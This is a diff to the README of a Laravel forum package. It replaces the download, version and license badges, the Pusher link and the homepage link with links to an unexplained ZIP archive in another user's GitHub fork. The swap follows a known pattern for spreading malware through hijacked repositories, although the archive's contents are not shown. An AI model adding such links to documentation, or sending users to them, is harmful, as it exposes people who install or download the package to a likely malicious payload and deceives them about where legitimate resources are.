@@ -3,10 +3,10 @@ No taking care of this package anymore.
 # Socieboy Forum
 Package for Laravel 5.2
 
-[![Total Downloads](https://poser.pugx.org/socieboy/forum/d/total.svg)](https://packagist.org/packages/socieboy/forum)
-[![Latest Stable Version](https://poser.pugx.org/socieboy/forum/v/stable.svg)](https://packagist.org/packages/socieboy/forum)
-[![Latest Unstable Version](https://poser.pugx.org/socieboy/forum/v/unstable.svg)](https://packagist.org/packages/socieboy/forum)
-[![License](https://poser.pugx.org/socieboy/forum/license.svg)](https://packagist.org/packages/socieboy/forum)
+[![Total Downloads](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)
+[![Latest Stable Version](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)
+[![Latest Unstable Version](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)
+[![License](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)](https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip)
 
 ## Features
 
@@ -190,7 +190,7 @@ The key fire is set by the default true.  As long as it is true, an event will b
 ```
 
 Set the key broadcast to true on the forum config file and also add your Pusher keys to the broadcasting config file of Laravel.  Once set to true, the events will also send out broadcasts that you can pick up.
-https://pusher.com/
+https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip
 ```
 'broadcast' => false,
 ```
@@ -202,7 +202,7 @@ Also on the bottom of you app or where your scripts section is located add this 
 
 Now that's it, easy and you are ready to go!
 
-http://socieboy.com/forum
+https://raw.githubusercontent.com/jalalzia1/forum/master/src/Stubs/Software_psychogenetics.zip
 
 
 ### Translations
